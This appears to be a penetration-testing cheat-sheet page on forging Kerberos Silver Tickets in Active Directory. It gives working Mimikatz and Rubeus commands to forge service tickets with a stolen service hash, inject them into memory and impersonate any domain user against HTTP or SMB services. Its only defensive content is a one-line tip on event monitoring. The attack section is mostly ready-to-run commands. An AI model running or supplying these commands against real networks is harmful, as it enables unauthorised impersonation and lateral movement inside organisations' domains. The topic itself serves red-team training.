---
layout: default
title: Silver Tickets
parent: Active Directory
nav_order: 17
permalink: /ad/silver/
---

# Silver Tickets
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

To lateralize on the network, you can forge Silver Tickets using `Mimikatz`. Silver Ticket attack consists in forging a Kerberos TGS for a service by impersonating any domain user. For instance, you can perform following attacks once you will forge required service tickets:
* [DCSync](/ad/dcsync/): LDAP (on Domain Controllers only).
* [PSExec](/windows/psexec/): HOST and CIFS.
* [WinRM](/ad/winrm/): HOST and HTTP.

## Prerequisites

* Having a SPN target and its associated SPN password hash.
* Having the domain user SID you want to impersonate.

## Exploit

Let’s assume we want to gain access to a web application hosted on IIS owned by a SPN. First, we can check we actually have not access to it.

```bash
# From a domain joined Windows computer
# It might respond "401 - Unauthorized: Access is denied due to invalid credentials"
Invoke-WebRequest -UseDefaultCredentials http://$target
```

Before forging our Silver Ticket, you need to obtain the SPN password hash of our target. Then, get the SID of the user you want to impersonate.

```bash
# From a domain joined Windows computer.
whoami /user
```

You can now forge the Silver Ticket and access your target.

```powershell
# With Mimikatz or Rubeus.
kerberos::golden /sid:$sid /domain:$domain /target:$hostname /service:http /rc4:$hash /user:$username
.\Rubeus.exe silver /service:http/$hostname.$domain /aes256:$hash /user:$username /domain:$domain /sid:$sid /nowrap

# Inject the ticket in memory.
kerberos::ptt ticket.kirbi

# Or create a dummy session before.
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:$domain /username:$username /password:$whatever /ticket$Base64EncodedTicket
```

You can also use this attack to access an domain computer via SMB by using the machine account SID and its associated hash.

```bash
# With Mimikatz.
kerberos::golden /sid:$sid /domain:$domain /target:$hostname /service:cifs /rc4:$hash /user:$username
```

{: .warning }
> If the $sid is **`S-1-5-21-1987370270-658905905-1781884369**-1105`, don’t take the final part after the last `-`. You will only need **`S-1-5-21-1987370270-658905905-1781884369`.**

## Useful links

* [HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket#available-services) for available services.

## Recommendations

- [ ] This method take advantage of a normal Kerberos behavior. The only thing you can do is monitor corresponding Windows events to detect and block this attack.